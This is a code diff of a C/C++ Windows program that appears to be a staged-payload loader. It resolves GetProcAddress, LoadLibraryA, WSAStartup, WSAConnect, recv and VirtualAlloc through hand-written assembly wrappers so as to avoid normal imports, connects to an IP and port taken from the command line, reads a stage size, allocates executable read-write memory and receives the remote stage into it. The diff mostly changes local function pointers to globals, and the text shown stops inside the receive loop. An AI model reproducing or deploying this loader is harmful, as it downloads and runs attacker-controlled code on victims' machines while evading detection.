@@ -16,6 +16,15 @@ extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD 
 
 WSADATA WSAData;
 HANDLE kernel32;
+HMODULE ws2_32;
+FARPROC _GetProcAddress;
+FARPROC _LoadLibraryA;
+FARPROC wsastartup;
+FARPROC wsasocketa;
+FARPROC _connect;
+FARPROC _recv;
+FARPROC _VirtualAlloc;
+LPVOID addr;
 
 int main(int argc, const char* argv[])
 {
@@ -32,7 +41,7 @@ int main(int argc, const char* argv[])
 		ip = argv[1];
 		port = strtol(argv[2], NULL, 10);
 	}
-
+	
 	SOCKET socket = 0;
 	int stageSize = 0;
 	int bytesReceived = 0;
@@ -41,35 +50,35 @@ int main(int argc, const char* argv[])
 
 	kernel32 = GetKernel32ModuleHandle();
 	printf("[+] Loaded kernel32.dll: 0x%x\n", kernel32);
-	FARPROC GetProcAddress = GetAddressOfGetProcAddress(kernel32);
-	printf("[+] Found GetProcAddress function: 0x%x\n", GetProcAddress);
-	FARPROC LoadLibraryA = asmGetProcAddress(kernel32, "LoadLibraryA", GetProcAddress);
-	printf("[+] Found LoadLibraryA: 0x%x\n", LoadLibraryA);
-	HMODULE ws2_32 = asmLoadLibrary("ws2_32", LoadLibraryA);
+	_GetProcAddress = GetAddressOfGetProcAddress(kernel32);
+	printf("[+] Found GetProcAddress function: 0x%x\n", _GetProcAddress);
+	_LoadLibraryA = asmGetProcAddress(kernel32, "LoadLibraryA", _GetProcAddress);
+	printf("[+] Found LoadLibraryA: 0x%x\n", _LoadLibraryA);
+	ws2_32 = asmLoadLibrary("ws2_32", _LoadLibraryA);
 	printf("[+] Loaded ws2_32.dll: 0x%x\n", ws2_32);
-	FARPROC wsastartup = asmGetProcAddress(ws2_32, "WSAStartup", GetProcAddress);
+	wsastartup = asmGetProcAddress(ws2_32, "WSAStartup", _GetProcAddress);
 	printf("[+] Found WSAStartup function: 0x%x\n", wsastartup);
-	FARPROC wsasocketa = asmGetProcAddress(ws2_32, "WSASocketA", GetProcAddress);
+	wsasocketa = asmGetProcAddress(ws2_32, "WSASocketA", _GetProcAddress);
 	printf("[+] Found WSASocketA function: 0x%x\n", wsasocketa);
 	asmWSAStartup(0x0101, &WSAData, wsastartup);
 	socket = asmWSASocketA(wsasocketa);
 	printf("[+] Obtained pointer to SOCKET: 0x%x\n", socket);
-	FARPROC connect = asmGetProcAddress(ws2_32, "WSAConnect", GetProcAddress);
-	printf("[+] Found Connect function: 0x%x\n", connect);
-	asmConnect(socket, ip, port, connect);
-	FARPROC recv = asmGetProcAddress(ws2_32, "recv", GetProcAddress);
-	printf("[+] Found Recv function: 0x%x\n", recv);
-	asmRecv(socket, &stageSize, 4, recv);
+	_connect = asmGetProcAddress(ws2_32, "WSAConnect", _GetProcAddress);
+	printf("[+] Found Connect function: 0x%x\n", _connect);
+	asmConnect(socket, ip, port, _connect);
+	_recv = asmGetProcAddress(ws2_32, "recv", _GetProcAddress);
+	printf("[+] Found Recv function: 0x%x\n", _recv);
+	asmRecv(socket, &stageSize, 4, _recv);
 	printf("[+] Obtained stage size: %d\n", stageSize);
-	FARPROC virtualAlloc = asmGetProcAddress(kernel32, "VirtualAlloc", GetProcAddress);
-	printf("[+] Found virtualAlloc function: 0x%x\n", virtualAlloc);
-	LPVOID addr = asmVirtualAlloc(virtualAlloc, stageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	_VirtualAlloc = asmGetProcAddress(kernel32, "VirtualAlloc", _GetProcAddress);
+	printf("[+] Found virtualAlloc function: 0x%x\n", _VirtualAlloc);
+	addr = asmVirtualAlloc(_VirtualAlloc, stageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	printf("[+] Allocated Memory for the stage: 0x%x\n", addr);
 	LPVOID addrBak = addr;
 
 	do
 	{
-		bytesReceived = asmRecv(socket, addr, stageSize, recv);
+		bytesReceived = asmRecv(socket, addr, stageSize, _recv);
 		printf("Bytes received: %d\n", bytesReceived);
 		printf("Left: %d\n", stageSize = stageSize - bytesReceived);
 		addr = ((char *) addr) + bytesReceived;
